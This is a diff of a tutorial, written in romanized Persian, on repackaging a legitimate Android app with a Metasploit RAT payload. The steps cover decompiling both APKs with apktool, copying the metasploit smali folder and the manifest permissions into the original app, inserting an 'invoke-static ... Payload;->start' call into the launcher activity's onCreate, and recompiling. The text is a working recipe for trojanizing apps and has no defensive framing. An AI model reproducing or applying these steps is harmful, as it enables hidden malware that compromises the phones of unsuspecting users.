@@ -25,13 +25,21 @@ sudo apt install apktool
 
 $ bar roye joft poshe haye decompile shode app ha ras click karde va gozine `open as Root` ra mizanim ta baz shavand
 
-### 3 kar ra bayad anjam dahim
+### 2 kar ra bayad anjam dahim
 
-1. **Jaygozine metasploit** Poshe "metasploit" ra az app alode dar address `smali > com > metasploit` dar hamin address dar app asli jaygozin mikonim 
+1. **Jaygozine metasploit** Poshe "metasploit" ra az app alode dar address `smali > com > metasploit` dar hamin address dar app asli jaygozin mikonim
+ ``` 
 2. **Edit AndroidManifest.xml** bar roye har 2 file `AndroidManifext.xml` click rast karde va `Open With "MousePad" ra mizanim va karhaye zer ra anjam midahim
 
 ```text
 - copy ebeart ro b ro az "rat" b "app"        <uses-permission android:""/>
+- search `activity android` va dar hamon khat ebarat `android:name=` ro b rosh ye hamchin chizi hast : `com.google.android.gms.common.api.GoogleApiActivity`
+- `com.google.android.gms.common.api.GoogleApiActivity` en masir ro dar "app asli" peyda mikonm
+example : Poshe smali > Poshe com > Poshe google > Poshe android > Poshe gms > Poshe common > ..... > Akharesh b ye "file" mirsim 
+- Dakhel file migardim donbal ebarat `onCreate(Landroid/os/Bundle;)v` Agar chand ta bood , On k avvalesh `method` Dare
+- Ye Enter mizanim va khat badi en `invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V` ro ezafe mikonim
 
 ```
-4. **Credentials** configured - This can be done manually or by running the `make setup` command from the root of this repo
+Dige ba "rat" kari nadarim va "app asli" ro Recompile mikonim va Tamam ....
+
+
